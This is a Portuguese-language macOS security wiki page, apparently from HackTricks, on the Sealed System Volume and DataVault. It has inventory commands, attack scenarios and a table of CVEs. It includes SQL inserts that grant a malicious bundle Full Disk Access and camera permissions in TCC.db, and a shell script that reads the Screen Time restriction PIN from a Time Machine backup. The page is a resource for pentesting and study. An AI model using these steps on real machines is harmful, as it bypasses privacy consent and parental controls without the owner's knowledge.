# Volume de Sistema Selado do macOS e DataVault

{{#include ../../../banners/hacktricks-training.md}}

## Volume de Sistema Selado (SSV)

### Informações básicas

A partir do **macOS Big Sur (11.0)**, o volume do sistema é selado criptograficamente usando uma **árvore hash de snapshot APFS**. Isso é chamado de **Volume de Sistema Selado (SSV)**. A partição do sistema é montada como **somente leitura**, e qualquer modificação rompe o selo, que é verificado durante a inicialização.<sup>[[11]](#references)</sup>

O SSV oferece:
- **Detecção de adulteração** — qualquer modificação nos binários ou frameworks do sistema altera a raiz da árvore Merkle e invalida o selo assinado pela Apple
- **Autenticação durante a inicialização** — a cadeia de inicialização verifica o snapshot do sistema selecionado antes de ele se tornar o sistema de arquivos raiz
- **Resistência a rootkits** — nem mesmo o root consegue substituir arquivos de forma persistente no snapshot autenticado do sistema sem desativar o authenticated root ou comprometer um caminho de atualização autorizado

O SSV protege o volume **System**, não o volume **Data** gravável associado a ele. Os Firmlinks mesclam os dois volumes no namespace visível em `/`, portanto um caminho que parece gravável não prova que o objeto subjacente pertença ao snapshot selado. O FileVault e o Data Protection protegem a confidencialidade dos dados em repouso; são mecanismos distintos da integridade do SSV.<sup>[[11]](#references)</sup>

### Verificando o status do SSV

```bash
# Check if authenticated root is enabled (SSV seal verification)
csrutil authenticated-root status

# List APFS snapshots (the sealed snapshot is the boot volume)
diskutil apfs listSnapshots disk3s1

# Check mount status (should show read-only)
mount | grep " / " 

# Show the volume group and the current Sealed field
diskutil apfs listVolumeGroups
diskutil apfs list | grep -B 8 -A 8 'Sealed:'
```

### Visão efetiva do sistema: enxertos de SSV + Cryptex

Nas versões recentes do macOS, nem todo executável visível em `/System` necessariamente vem do snapshot SSV inicializado. **Cryptexes** são imagens de disco APFS autenticadas separadamente, cujo conteúdo é montado sobre diretórios selecionados; assim, as Rapid Security Responses podem substituir componentes sensíveis à segurança sem reconstruir o SSV base. Ao investigar persistência ou comparar código do sistema, faça o inventário das montagens ativas e do armazenamento de Cryptex no Preboot, em vez de calcular hashes apenas do snapshot base:

```bash
mount | grep -Ei 'cryptex|graft'
find /System/Volumes/Preboot/Cryptexes -maxdepth 4 -type d 2>/dev/null
```

O boot-chain e os detalhes do Rapid Security Response são abordados em [macOS Architecture — Cryptexes](../mac-os-architecture/README.md#cryptexes-and-rapid-security-responses); esta seção se concentra no limite do SSV.

### Entitlements de gravação do SSV

Alguns binários do sistema da Apple têm entitlements que permitem modificar ou gerenciar o volume de sistema selado:

| Entitlement | Finalidade |
|---|---|
| `com.apple.private.apfs.revert-to-snapshot` | Reverter o volume do sistema para um snapshot anterior |
| `com.apple.private.apfs.create-sealed-snapshot` | Criar um novo snapshot selado após atualizações do sistema |
| `com.apple.rootless.install.heritable` | Gravar em caminhos protegidos pelo SIP (herdado pelos processos filhos) |
| `com.apple.rootless.install` | Gravar em caminhos protegidos pelo SIP |

### Encontrando gravadores do SSV

```bash
# Search for binaries with SSV-related entitlements
find /System /usr -type f -perm +111 -exec sh -c '
  ents=$(codesign -d --entitlements - "{}" 2>&1)
  echo "$ents" | grep -q "apfs.revert-to-snapshot\|apfs.create-sealed-snapshot\|rootless.install" && echo "{}"
' \; 2>/dev/null

# Using the scanner database
sqlite3 /tmp/executables.db "
SELECT e.path, c.name
FROM executables e
JOIN executable_capabilities ec ON e.id = ec.executable_id
JOIN capabilities c ON ec.capability_id = c.id
WHERE c.name = 'ssv_writer';"
```

### Cenários de ataque

#### Ataque de rollback de snapshot

Se um invasor comprometer um binário com `com.apple.private.apfs.revert-to-snapshot`, poderá **reverter o volume do sistema para um estado anterior à atualização**, restaurando vulnerabilidades conhecidas:

```bash
# Conceptual — the snapshot revert operation would:
# 1. List available snapshots
diskutil apfs listSnapshots disk3s1

# 2. Revert to an older snapshot (requires the entitlement)
# This restores the system to a state with known, patched vulnerabilities
```

> [!WARNING]
> O rollback de snapshots efetivamente **desfaz atualizações de segurança**, restaurando vulnerabilidades do kernel e do sistema que já haviam sido corrigidas. Esta é uma das operações mais perigosas possíveis no macOS moderno.

#### Substituição de Binários do Sistema

Com o bypass do SIP + capacidade de escrita no SSV, um atacante pode:

1. Montar o volume do sistema com permissão de leitura e escrita
2. Substituir um daemon do sistema ou uma biblioteca de framework por uma versão trojanizada
3. Selar novamente o snapshot (ou aceitar o selo quebrado se o SIP já estiver degradado)
4. O rootkit persiste após reinicializações e é invisível para ferramentas de detecção em userland

### CVEs do Mundo Real

| CVE | Descrição |
|---|---|
| CVE-2021-30892 | **Shrootless** — bypass do SIP que explora o entitlement `com.apple.rootless.install.heritable` de `system_installd` para executar scripts arbitrários de pós-instalação ([Microsoft](https://www.microsoft.com/en-us/security/blog/2021/10/28/microsoft-finds-new-macos-vulnerability-shrootless-that-could-bypass-system-integrity-protection/))<sup>[[1]](#references)</sup> |
| CVE-2022-22583 | Bypass do SIP: `system_installd` preparava o script de pós-instalação em uma pasta protegida pelo SIP sob `/tmp`, mas o próprio `/tmp` não é protegido pelo SIP, então a pasta podia ser substituída montando uma imagem sobre ela ([Trend Micro](https://www.trendmicro.com/en_us/research/22/l/a-technical-analysis-of-cve-2022-22583-and-cve-2022-32800.html))<sup>[[2]](#references)</sup> |
| CVE-2022-46689 | **MacDirtyCow** — race de copy-on-write no XNU que permite escrever em arquivos somente leitura pertencentes ao root ([Worth Doing Badly](https://worthdoingbadly.com/macdirtycow/))<sup>[[3]](#references)</sup> |

---

## DataVault

### Informações Básicas

**DataVault** é uma proteção de sistema de arquivos, controlada por entitlement, para arquivos e diretórios sensíveis. A flag BSD `UF_DATAVAULT` (`0x00000080`) marca um objeto como exigindo um entitlement tanto para leitura quanto para escrita; ao contrário do DAC normal, simplesmente tornar-se **root** ou receber Full Disk Access não satisfaz essa verificação enquanto a proteção estiver ativa.<sup>[[4]](#references)[[13]](#references)</sup>

Não use “DataVault” como sinônimo de todo banco de dados protegido. Os bancos de dados TCC são regidos por políticas específicas do TCC/FDA e do SIP (consulte [macOS TCC](macos-tcc/README.md)), enquanto o acesso a itens do keychain também depende de ACLs do Keychain e de proteção criptográfica (consulte [macOS Keychain](../../macos-red-teaming/macos-keychain.md)). Exemplos reais de DataVault costumam aparecer em armazenamentos pertencentes a serviços abaixo de `/private/var/folders/.../0/`, como o armazenamento do Screen Time; a flag fica visível como `datavault` nas flags de arquivo BSD quando é possível obter o stat do diretório pai.

### Entitlements de Controladores do DataVault

| Entitlement | Limite |
|---|---|
| `com.apple.rootless.datavault.controller` | Acessar/gerenciar objetos `UF_DATAVAULT`<sup>[[13]](#references)</sup> |
| `com.apple.private.tcc.manager` | Gerenciar decisões do TCC; este é um limite de privacidade relacionado, mas separado |
| `com.apple.private.tcc.allow` | Ignorar serviços TCC selecionados, especificados no valor do entitlement |
| `com.apple.rootless.storage.TCC` | Escrever no armazenamento do TCC protegido pelo SIP |

Um processo que combine um entitlement de controlador do DataVault com funcionalidades de FDA, backup, indexação ou IPC é especialmente interessante: procure um primitivo de confused deputy que copie um objeto protegido para um caminho comum, em vez de tentar abrir o vault diretamente.<sup>[[14]](#references)</sup>

### Encontrando Controladores do DataVault

```bash
# BSD flags: a protected object is printed with the `datavault` keyword
ls -ldeO@ /private/var/folders/*/*/0/com.apple.ScreenTimeAgent 2>/dev/null
sudo find /private/var/folders -flags +datavault -print 2>/dev/null

# Find Apple binaries carrying DataVault/TCC controller entitlements
find /System /usr -type f -perm +111 -exec sh -c '
  ents=$(codesign -d --entitlements - "{}" 2>&1)
  echo "$ents" | grep -q "datavault.controller\|private.tcc\|rootless.storage.TCC" && echo "{}"
' \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, c.name
FROM executables e
JOIN executable_capabilities ec ON e.id = ec.executable_id
JOIN capabilities c ON ec.capability_id = c.id
WHERE c.name = 'datavault_controller';"
```

### Cenários de ataque

#### Modificação direta do banco de dados TCC (limite TCC separado)

Se um invasor comprometer um processo gerenciador do TCC (por exemplo, por meio de code injection em um processo com `com.apple.private.tcc.manager`), poderá **modificar diretamente o banco de dados TCC** para conceder qualquer permissão TCC a qualquer aplicativo:<sup>[[12]](#references)</sup>

```sql
-- Grant Full Disk Access to a malicious binary (conceptual)
INSERT INTO access (service, client, client_type, auth_value, auth_reason, auth_version)
VALUES ('kTCCServiceSystemPolicyAllFiles', 'com.attacker.malware', 0, 2, 4, 1);

-- Grant camera access without a prompt
INSERT INTO access (service, client, client_type, auth_value, auth_reason, auth_version)
VALUES ('kTCCServiceCamera', 'com.attacker.malware', 0, 2, 4, 1);
```

> [!CAUTION]
> A modificação do banco de dados TCC é o **bypass definitivo de privacidade** — concede qualquer permissão silenciosamente, sem qualquer solicitação ao usuário ou indicador visível. Historicamente, várias cadeias de escalonamento de privilégios no macOS terminaram com gravações no banco de dados TCC como payload final.

#### Acesso ao banco de dados do Keychain

O acesso bruto a um banco de dados subjacente do Keychain não equivale ao acesso a segredos em plaintext. Mesmo que outra fronteira de privilégios permita que um atacante copie o banco de dados, ainda é necessário atacar o material de chave e as ACLs dos itens; consulte a página dedicada ao [macOS Keychain](../../macos-red-teaming/macos-keychain.md) em vez de presumir que um entitlement de controlador DataVault seja suficiente.

#### Limite da cópia de backup: Time Machine

Uma análise de 2026 demonstrou um padrão geral útil: `backupd` possui tanto `com.apple.rootless.datavault.controller` quanto Full Disk Access para poder copiar armazenamentos protegidos. Na configuração testada, `/private/var/folders` estava incluído no Time Machine, e a cópia de backup montada não impunha o limite DataVault ativo. O pesquisador usou isso para localizar o armazenamento SQLite do Screen Time e ler seu PIN de restrição em plaintext sem abrir o vault ativo. Considere isso um **ataque ao limite da cópia**: enumere processos auxiliares de backup, exportação, migração, indexação e diagnóstico que possam materializar dados do vault em um ponto de montagem ou caminho com proteções mais fracas.<sup>[[13]](#references)[[14]](#references)</sup>

```bash
# Confirm the deputy's privileges and whether the source tree is included
codesign -d --entitlements - /System/Library/CoreServices/TimeMachine/backupd 2>&1
tmutil isexcluded /private/var/folders

# Inspect the newest mounted backup; paths vary per host
backup="$(tmutil latestbackup)"
db="$(find "$backup/Data/private/var/folders" -path '*/com.apple.ScreenTimeAgent/Store/RMAdminStore-Local.sqlite' -print -quit 2>/dev/null)"
sqlite3 "$db" 'SELECT ZPASSCODE1 FROM ZCOREORGANIZATIONSETTINGS WHERE ZPASSCODE1 IS NOT NULL LIMIT 1;'
```

Esse comportamento depende da versão e da estrutura do backup. Valide-o na build de destino e lembre-se de que um destino criptografado do Time Machine só protege a cópia enquanto está bloqueado; depois de montado, seus controles de acesso passam a fazer parte da superfície de ataque.

### CVEs reais envolvendo DataVault/bypass de TCC

| CVE | Descrição |
|---|---|
| CVE-2024-44131 | Uma condição de corrida com symlink no FileProvider permite que um helper privilegiado acesse dados protegidos pelo TCC ([Jamf](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/))<sup>[[5]](#references)</sup> |
| CVE-2023-40424 | Como root, **crie um novo usuário cujo `NFSHomeDirectory` aponte para um `TCC.db` controlado pelo atacante**; no login, o `tccd` o utiliza e aplica as permissões, permitindo acessar os dados de outros usuários ([Kandji](https://blog.kandji.io/malware-bypass-tcc))<sup>[[6]](#references)</sup> |
| CVE-2021-30970 | "powerdir": alterar o diretório pessoal do usuário para inserir um TCC.db controlado pelo atacante ([Microsoft](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/))<sup>[[7]](#references)</sup> |
| CVE-2021-30713 | Uma falha na conclusão do bundle permite que um app **herde as permissões de TCC de um bundle doador** sem exibir um aviso; explorada ativamente pelo **XCSSET** para capturar a tela da área de trabalho ([Jamf](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/))<sup>[[8]](#references)</sup> |
| CVE-2020-9934 | O `tccd` construía o caminho do banco de dados a partir de `$HOME`, então `launchctl setenv HOME` o redirecionava para um `TCC.db` controlado pelo atacante ([Matt Shockley](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8))<sup>[[9]](#references)</sup> |
| CVE-2020-29621 | O `coreaudiod` tinha `com.apple.private.tcc.manager` **e** a validação de bibliotecas desativada, permitindo que um plug-in HAL instalado em `/Library/Audio/Plug-Ins/HAL` concedesse quaisquer permissões do TCC ([Wojciech Reguła](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/))<sup>[[10]](#references)</sup> |



## References

- [1] [A Microsoft encontra uma nova vulnerabilidade no macOS, Shrootless, que poderia contornar a Proteção da Integridade do Sistema](https://www.microsoft.com/en-us/security/blog/2021/10/28/microsoft-finds-new-macos-vulnerability-shrootless-that-could-bypass-system-integrity-protection/)
- [2] [Análise técnica: CVE-2022-22583 - Trend Micro](https://www.trendmicro.com/en_us/research/22/l/a-technical-analysis-of-cve-2022-22583-and-cve-2022-32800.html)
- [3] [MacDirtyCow - Vale a pena fazer malfeito](https://worthdoingbadly.com/macdirtycow/)
- [4] [Segurança das plataformas Apple — Proteção de dados](https://support.apple.com/guide/security/data-protection-overview-sece3bee0835/web)
- [5] [Jamf Threat Labs - CVE-2024-44131: bypass de TCC rouba dados do iCloud](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/)
- [6] [Kandji - Desvendando malware para macOS: contornando o TCC](https://blog.kandji.io/malware-bypass-tcc)
- [7] [Nova vulnerabilidade no macOS, "powerdir", pode levar ao acesso não autorizado a dados de usuários](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/)
- [8] [Bypass de TCC zero-day descoberto no malware XCSSET](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)
- [9] [CVE-2020–9934: contornando o framework Transparency, Consent, and Control (TCC) do macOS](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
- [10] [Toque música e contorne o TCC, também conhecido como CVE-2020-29621](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/)
- [11] [O pesadelo das atualizações OTA da Apple (snapshots APFS)](https://jhftss.github.io/The-Nightmare-of-Apple-OTA-Update/)
- [12] [Objective-See — exploração do TCC](https://objective-see.org/blog/blog_0x4C.html)
- [13] [XNU `stat.h` — `UF_DATAVAULT`](https://github.com/apple-oss-distributions/xnu/blob/main/bsd/sys/stat.h)
- [14] [Como contornar seu próprio código do Tempo de Uso — análise do código-fonte e do Time Machine/DataVault](https://tangled.org/dunkirk.sh/zera/commit/e6b6236c395e5c9ec1a27ad2a76217d8cc2b4312)
{{#include ../../../banners/hacktricks-training.md}}
